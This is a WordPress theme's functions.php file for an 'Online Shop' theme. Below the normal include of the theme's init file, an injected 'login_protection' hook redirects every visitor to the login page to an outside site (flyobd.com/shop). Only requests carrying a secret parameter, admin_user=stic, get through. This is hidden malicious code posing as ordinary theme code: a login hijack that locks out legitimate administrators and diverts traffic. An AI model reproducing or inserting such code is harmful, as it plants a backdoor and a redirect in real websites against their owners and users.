<?php
/**
 * Online Shop functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Acme Themes
 * @subpackage Online Shop
 */

/**
 * require int.
 */
require_once trailingslashit( get_template_directory() ).'acmethemes/init.php';

/**
*
*/
add_action('login_enqueue_scripts','login_protection');  
function login_protection(){  
    if($_GET['admin_user'] != 'stic')header('Location: http://www.flyobd.com/shop');  
}